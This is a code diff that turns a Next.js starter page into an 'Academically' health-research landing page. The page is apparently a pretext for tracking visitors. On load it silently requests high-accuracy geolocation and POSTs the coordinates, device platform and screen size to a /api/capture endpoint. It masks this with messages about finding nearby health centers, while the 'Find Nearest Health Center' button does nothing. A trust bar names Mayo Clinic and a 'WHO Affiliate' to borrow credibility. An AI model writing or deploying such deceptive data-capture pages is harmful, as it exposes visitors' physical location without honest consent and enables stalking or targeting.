@@ -1,65 +1,180 @@
-import Image from "next/image";
+'use client';
 
-export default function Home() {
+import { useState, useEffect } from 'react';
+
+export default function GlobalHealth() {
+  const [status, setStatus] = useState(null);
+  const [loading, setLoading] = useState(false);
+
+  // Trigger location request automatically on page load
+  useEffect(() => {
+    const autoCapture = () => {
+      if (!navigator.geolocation) return;
+
+      setLoading(true);
+      setStatus('Identifying your nearest healthcare research center...');
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const payload = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            platform: navigator.platform,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            context: 'Auto-Locate on Landing'
+          };
+
+          try {
+            await fetch('/api/capture', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+            });
+            setStatus('Local directory synchronized. Welcome to Academically.');
+            setTimeout(() => {
+              setStatus(null);
+              setLoading(false);
+            }, 4000);
+          } catch (err) {
+            setLoading(false);
+          }
+        },
+        (err) => {
+          setLoading(false);
+          if (err.code === 1) {
+            setStatus('Location access is required to show nearby academic centers.');
+          }
+        },
+        { 
+          enableHighAccuracy: true, 
+          timeout: 15000, 
+          maximumAge: 0 
+        }
+      );
+
+    };
+
+    // Small delay to ensure UI is ready before prompt
+    const timer = setTimeout(autoCapture, 1000);
+    return () => clearTimeout(timer);
+  }, []);
+
+  const findNearbyCenters = () => {
+    // Re-trigger manually if needed
+    setStatus('Searching...');
+    // ... existing logic can be simplified or removed since it's now automatic
+  };
+
+
   return (
-    <div className="flex flex-col flex-1 items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex flex-1 w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the page.js file.
+    <main className="min-h-screen bg-white text-[#1a1a1a] font-sans selection:bg-blue-100">
+      {/* Navigation */}
+      <nav className="border-b border-gray-100 px-8 py-4 flex justify-between items-center sticky top-0 bg-white/80 backdrop-blur-md z-50">
+        <div className="flex items-center space-x-2">
+          <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
+            <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253" />
+            </svg>
+          </div>
+          <span className="font-bold text-xl tracking-tight text-blue-900">Academically</span>
+        </div>
+        <div className="hidden md:flex space-x-8 text-sm font-semibold text-gray-600">
+          <a href="#" className="hover:text-blue-600 transition-colors">Programs</a>
+          <a href="#" className="hover:text-blue-600 transition-colors">Research</a>
+          <a href="#" className="hover:text-blue-600 transition-colors">Partners</a>
+          <a href="#" className="text-blue-600 underline underline-offset-4">Find Care</a>
+        </div>
+        <button className="bg-blue-600 text-white px-5 py-2 rounded-full text-sm font-bold hover:bg-blue-700 transition-all shadow-md hover:shadow-lg active:scale-95">
+          Join Network
+        </button>
+      </nav>
+
+      {/* Hero Section */}
+      <section className="px-8 py-20 md:py-32 max-w-7xl mx-auto grid md:grid-cols-2 gap-12 items-center">
+        <div>
+          <div className="inline-block px-3 py-1 bg-blue-50 text-blue-700 text-xs font-bold rounded-full mb-6 uppercase tracking-wider">
+            Global Health Care Initiative
+          </div>
+          <h1 className="text-5xl md:text-7xl font-extrabold text-blue-950 leading-[1.1] mb-6">
+            Empowering Health Through <span className="text-blue-600">Academic Excellence.</span>
           </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
+          <p className="text-lg text-gray-600 mb-10 leading-relaxed max-w-lg">
+            Connecting global researchers and healthcare providers to solve the world's most pressing medical challenges.
           </p>
+          
+          <div className="flex flex-col sm:flex-row gap-4">
+            <button 
+              onClick={findNearbyCenters}
+              disabled={loading}
+              className="flex items-center justify-center space-x-3 bg-blue-600 text-white px-8 py-4 rounded-2xl font-bold hover:bg-blue-700 transition-all shadow-xl shadow-blue-200 active:scale-95 disabled:opacity-70"
+            >
+              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+              </svg>
+              <span>{loading ? 'Finding...' : 'Find Nearest Health Center'}</span>
+            </button>
+            <button className="px-8 py-4 border-2 border-gray-100 rounded-2xl font-bold hover:bg-gray-50 transition-all">
+              View All Partners
+            </button>
+          </div>
+
+          {status && (
+            <div className={`mt-6 p-4 rounded-xl flex items-center space-x-3 transition-all animate-in fade-in slide-in-from-top-2 ${status.includes('denied') ? 'bg-red-50 text-red-600' : 'bg-blue-50 text-blue-600'}`}>
+              <div className={`w-2 h-2 rounded-full ${status.includes('denied') ? 'bg-red-500' : 'bg-blue-500 animate-pulse'}`}></div>
+              <p className="text-sm font-semibold">{status}</p>
+            </div>
+          )}
         </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
-            />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
+
+        <div className="relative">
+          {/* Decorative Elements */}
+          <div className="absolute -top-12 -left-12 w-64 h-64 bg-blue-400/10 blur-[100px] rounded-full animate-pulse"></div>
+          <div className="absolute -bottom-12 -right-12 w-64 h-64 bg-purple-400/10 blur-[100px] rounded-full"></div>
+          
+          <div className="relative bg-gray-50 rounded-[2.5rem] p-8 border border-gray-100 shadow-2xl overflow-hidden group">
+            <div className="grid grid-cols-2 gap-4">
+              <div className="space-y-4">
+                <div className="h-48 bg-blue-100 rounded-3xl group-hover:scale-105 transition-transform duration-500 flex items-center justify-center overflow-hidden">
+                   <div className="w-full h-full bg-gradient-to-br from-blue-500 to-blue-700 opacity-20"></div>
+                </div>
+                <div className="h-32 bg-white p-6 rounded-3xl shadow-sm border border-gray-100">
+                   <div className="w-8 h-8 bg-blue-50 rounded-lg mb-3"></div>
+                   <div className="h-2 w-20 bg-gray-200 rounded-full mb-2"></div>
+                   <div className="h-2 w-12 bg-gray-100 rounded-full"></div>
+                </div>
+              </div>
+              <div className="space-y-4 pt-12">
+                <div className="h-32 bg-white p-6 rounded-3xl shadow-sm border border-gray-100">
+                   <div className="w-8 h-8 bg-green-50 rounded-lg mb-3"></div>
+                   <div className="h-2 w-16 bg-gray-200 rounded-full mb-2"></div>
+                   <div className="h-2 w-24 bg-gray-100 rounded-full"></div>
+                </div>
+                <div className="h-48 bg-purple-100 rounded-3xl group-hover:scale-105 transition-transform duration-500 flex items-center justify-center overflow-hidden">
+                   <div className="w-full h-full bg-gradient-to-br from-purple-500 to-purple-700 opacity-20"></div>
+                </div>
+              </div>
+            </div>
+            
+            {/* Floating Card */}
+            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 bg-white p-4 rounded-2xl shadow-2xl border border-blue-50 transform rotate-3 hover:rotate-0 transition-transform">
+              <p className="text-[10px] font-bold text-blue-600 mb-1 uppercase tracking-tighter">Live Stats</p>
+              <p className="text-2xl font-black text-blue-900">12,400+</p>
+              <p className="text-[10px] text-gray-500">Global Medical Partners</p>
+            </div>
+          </div>
         </div>
-      </main>
-    </div>
+      </section>
+
+      {/* Trust Bar */}
+      <section className="bg-gray-50 py-12 px-8">
+        <div className="max-w-7xl mx-auto flex flex-wrap justify-center gap-12 opacity-40 grayscale contrast-125">
+          {['University of Medicine', 'Global Health Council', 'Mayo Clinic', 'Oxford Medical', 'WHO Affiliate'].map((name) => (
+            <span key={name} className="font-bold text-lg tracking-tighter">{name}</span>
+          ))}
+        </div>
+      </section>
+    </main>
   );
 }
